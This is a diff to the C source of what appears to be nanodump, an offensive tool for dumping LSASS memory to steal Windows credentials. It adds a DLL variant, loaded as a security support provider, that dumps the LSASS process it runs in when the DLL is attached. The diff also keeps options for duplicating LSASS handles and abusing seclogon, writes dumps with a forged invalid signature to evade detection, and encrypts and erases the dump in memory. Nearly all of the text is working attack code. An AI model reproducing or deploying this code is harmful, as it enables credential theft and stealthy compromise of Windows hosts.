@@ -1,6 +1,8 @@
 #include "nanodump.c"
 
-#ifdef BOF
+
+#if defined(NANO) && defined(BOF)
+
 void go(char* args, int length)
 {
     datap   parser;
@@ -54,12 +56,12 @@ void go(char* args, int length)
     }
     else
     {
-        DPRINT("Using %ld as the PID of LSASS", lsass_pid);
+        DPRINT("Using %ld as the PID of " LSASS, lsass_pid);
     }
 
     if (get_pid_and_leave)
     {
-        PRINT("LSASS PID: %ld", lsass_pid);
+        PRINT(LSASS " PID: %ld", lsass_pid);
         return;
     }
 
@@ -212,13 +214,13 @@ void go(char* args, int length)
     );
 }
 
-#else
+#elif defined(NANO) && defined(EXE)
 
 void usage(char* procname)
 {
     PRINT("usage: %s [--getpid] --write C:\\Windows\\Temp\\doc.docx [--valid] [--fork] [--dup] [--malseclogon] [--binary C:\\Windows\\notepad.exe] [--help]", procname);
     PRINT("    --getpid");
-    PRINT("            print the PID of LSASS and leave");
+    PRINT("            print the PID of " LSASS " and leave");
     PRINT("    --write DUMP_PATH, -w DUMP_PATH");
     PRINT("            filename of the dump");
     PRINT("    --valid, -v");
@@ -226,9 +228,9 @@ void usage(char* procname)
     PRINT("    --fork, -f");
     PRINT("            fork target process before dumping");
     PRINT("    --dup, -d");
-    PRINT("            duplicate an existing LSASS handle");
+    PRINT("            duplicate an existing " LSASS " handle");
     PRINT("    --malseclogon, -m");
-    PRINT("            obtain a handle to LSASS by (ab)using seclogon");
+    PRINT("            obtain a handle to " LSASS " by (ab)using seclogon");
     PRINT("    --binary BIN_PATH, -b BIN_PATH");
     PRINT("            full path to the decoy binary used with --dup and --malseclogon");
     PRINT("    --help, -h");
@@ -369,12 +371,12 @@ int main(int argc, char* argv[])
     }
     else
     {
-        DPRINT("Using %ld as the PID of LSASS", lsass_pid);
+        DPRINT("Using %ld as the PID of " LSASS, lsass_pid);
     }
 
     if (get_pid_and_leave)
     {
-        PRINT("LSASS PID: %ld", lsass_pid);
+        PRINT(LSASS " PID: %ld", lsass_pid);
         return 0;
     }
 
@@ -544,6 +546,106 @@ int main(int argc, char* argv[])
         );
     }
     return 0;
+}
+
+#elif defined(NANO) && defined(SSP)
+
+#include "ssp.h"
+
+BOOL NanoDump(void)
+{
+    /******************* change this *******************/
+    LPCSTR dump_path     = "C:\\Windows\\Temp\\nano.dmp";
+    BOOL   use_valid_sig = FALSE;
+    /***************************************************/
+
+    ULONG32 Signature;
+    SHORT   Version;
+    SHORT   ImplementationVersion;
+    BOOL    success;
+    wchar_t wcFilePath[MAX_PATH];
+    UNICODE_STRING full_dump_path;
+    full_dump_path.Buffer = wcFilePath;
+    full_dump_path.Length = 0;
+    full_dump_path.MaximumLength = 0;
+
+    get_full_path(&full_dump_path, dump_path);
+
+    if (!create_file(&full_dump_path))
+        return FALSE;
+
+    // set the signature
+    if (use_valid_sig)
+    {
+        Signature = MINIDUMP_SIGNATURE;
+        Version = MINIDUMP_VERSION;
+        ImplementationVersion = MINIDUMP_IMPL_VERSION;
+    }
+    else
+    {
+        generate_invalid_sig(
+            &Signature,
+            &Version,
+            &ImplementationVersion
+        );
+    }
+
+    // we are LSASS after all :)
+    HANDLE hProcess = NtCurrentProcess();
+
+    // allocate a chuck of memory to write the dump
+    SIZE_T region_size = DUMP_MAX_SIZE;
+    PVOID base_address = allocate_memory(&region_size);
+    if (!base_address)
+        return FALSE;
+
+    dump_context dc;
+    dc.hProcess = hProcess;
+    dc.BaseAddress = base_address;
+    dc.rva = 0;
+    dc.DumpMaxSize = region_size;
+    dc.Signature = Signature;
+    dc.Version = Version;
+    dc.ImplementationVersion = ImplementationVersion;
+
+    success = NanoDumpWriteDump(&dc);
+    if (!success)
+        return FALSE;
+
+    // at this point, you can encrypt or obfuscate the dump
+    encrypt_dump(&dc);
+
+    success = write_file(
+        &full_dump_path,
+        dc.BaseAddress,
+        dc.rva
+    );
+    if (!success)
+        return FALSE;
+
+    erase_dump_from_memory(&dc);
+
+    return TRUE;
+}
+
+__declspec(dllexport) BOOL APIENTRY DllMain(
+    HINSTANCE hinstDLL,
+    DWORD fdwReason,
+    LPVOID lpReserved
+)
+{
+    switch (fdwReason) {
+        case DLL_PROCESS_ATTACH:
+            NanoDump();
+            break;
+        case DLL_THREAD_ATTACH:
+            break;
+        case DLL_THREAD_DETACH:
+            break;
+        case DLL_PROCESS_DETACH:
+            break;
+    }
+    return FALSE;
 }
 
 #endif
